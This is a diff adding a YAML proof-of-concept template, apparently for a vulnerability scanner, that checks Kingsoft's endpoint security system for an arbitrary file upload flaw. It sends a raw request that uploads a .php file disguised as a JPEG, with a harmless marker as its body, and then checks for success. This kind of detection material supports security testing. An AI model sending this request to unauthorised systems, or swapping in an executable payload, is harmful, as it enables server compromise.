@@ -1,0 +1,29 @@
+id: poc-yaml-kingsoft-zdaq-system-file-upload
+info:
+  name: 金山终端安全系统任意文件上传
+  severity: high
+  tags:
+  - 文件上传
+  finger: 金山终端安全系统
+requests:
+- raw: 'POST /tools/manage/upload.php HTTP/1.1
+
+    Host:
+
+    Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryCmFouLjmLS7D4iZr
+
+
+    ------WebKitFormBoundaryCmFouLjmLS7D4iZr
+
+    Content-Disposition: form-data; name="file"; filename="4bbc9855ce373d60847521589b287ced.php"
+
+    Content-Type: image/jpeg
+
+
+    <%out.print(1237);%>
+
+    ------WebKitFormBoundaryCmFouLjmLS7D4iZr--'
+  expression: status_code == 200 && contains(body,"successfully") && contains(body,"[name]
+    => 4bbc9855ce373d60847521589b287ced.php") && content_type == "text/html; charset=UTF-8"
+variables: {}
+transport: http
